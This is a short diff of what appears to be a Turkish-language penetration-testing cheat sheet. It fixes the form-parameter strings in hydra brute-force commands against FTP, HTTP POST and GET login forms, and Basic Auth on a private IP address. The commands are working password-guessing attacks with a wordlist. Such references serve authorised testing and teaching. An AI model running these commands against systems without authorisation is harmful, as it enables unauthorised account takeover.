@@ -18,11 +18,11 @@ hydra -l admin -P wordlist.txt ftp://192.168.1.10
 
 # HTTP Form POST
 hydra -l admin -P wordlist.txt 192.168.1.10 http-post-form \
-  "/login.php:username=^USER^&****** parola"
+  "/login.php:username=^USER^&pass=^PASS^:Gecersiz kullanici"
 
 # HTTP Form GET
 hydra -l admin -P wordlist.txt 192.168.1.10 http-get-form \
-  "/login.php:username=^USER^&****** parola"
+  "/login.php:username=^USER^&pass=^PASS^:Gecersiz kullanici"
 
 # HTTP Basic Auth
 hydra -l admin -P wordlist.txt http-get://192.168.1.10/admin
